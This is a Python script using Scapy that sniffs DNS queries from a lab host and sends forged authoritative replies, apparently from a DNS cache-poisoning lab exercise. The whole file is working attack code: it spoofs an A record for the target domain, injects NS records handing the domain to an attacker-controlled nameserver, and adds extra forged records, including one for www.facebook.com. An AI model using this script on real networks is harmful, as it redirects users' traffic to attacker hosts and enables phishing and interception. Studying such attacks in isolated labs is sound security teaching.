#!/usr/bin/python3
from scapy.all import *
TARGET_DOMAIN = "www.example.net." #target domain
SPOOFED_IP = "8.8.8.8" #ip we want to redirect to
def dns_spoof(pkt):
    #DNS question for our target domain
    #pkt[DNS].qd.qname = b"www.bank32.com."
    #pkt[DNS].qr==0 for querry
    if (DNS in pkt and pkt[DNS].qr == 0 and pkt[DNS].qd.qname == bytes(TARGET_DOMAIN, 'utf-8')):
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
        # Answer section
        an_dns=DNSRR(
            rrname=pkt[DNS].qd.qname,#domain name
            type='A',#Address record(ipv4 matching)
            ttl=259200,# Time to live (secondes)
            rdata=SPOOFED_IP # Our spoofed IP address
        )#Authaurative section
        ns_dns=DNSRR(
            rrname="example.net.",  # The entire domain
            type='NS',            # This is a nameserver record
            ttl=259200,           # Long TTL for the authority record
            rdata="attacker32.com."       #Attacker-controlled nameserver
        )#Authaurative section2
        ns_dns2=DNSRR(
            rrname="example.net.",  # The entire domain
            type='NS',            # This is a nameserver record
            ttl=259200,           # Long TTL for the authority record
            rdata="ns.example.net."       #Attacker-controlled nameserver
        )
        add_dns1=DNSRR(
            rrname="attacker32.com.",#domain name
            type='A',#Address record(ipv4 matching)
            ttl=259200,# Time to live (secondes)
            rdata="1.2.3.4" # Our spoofed IP address
        )
        add_dns2=DNSRR(
            rrname="ns.example.net.",#domain name
            type='A',#Address record(ipv4 matching)
            ttl=259200,# Time to live (secondes)
            rdata="5.6.7.8" # Our spoofed IP address
        )
        add_dns3=DNSRR(
            rrname="www.facebook.com.",#domain name
            type='A',#Address record(ipv4 matching)
            ttl=259200,# Time to live (secondes)
            rdata="3.4.5.6" # Our spoofed IP address
        )
        
        dns = DNS(
            id=pkt[DNS].id,#same id of transaction
            qr=1,# response
            aa=1,# Authoritative Answer(comes directly from it)
            # Recursion Desired(same because as he wants to console other servers if needed)
            rd=pkt[DNS].rd,
            ra=0,# Recursion Available(set=0 because Authoritative server we said)
            # question section -> number of questions
            # (answer section, authority section, additional section)->number of records
            qdcount=1, ancount=1, nscount=2, arcount=3,
            qd=pkt[DNS].qd,# Question section (directly from the query)
            an = an_dns,
            ns = ns_dns/ns_dns2,
            ar = add_dns1/add_dns2/add_dns3
        )
        spoofed_pkt = ip/udp/dns
        send(spoofed_pkt)
sniff(filter="udp and port 53 and src host 10.0.2.5", prn=dns_spoof)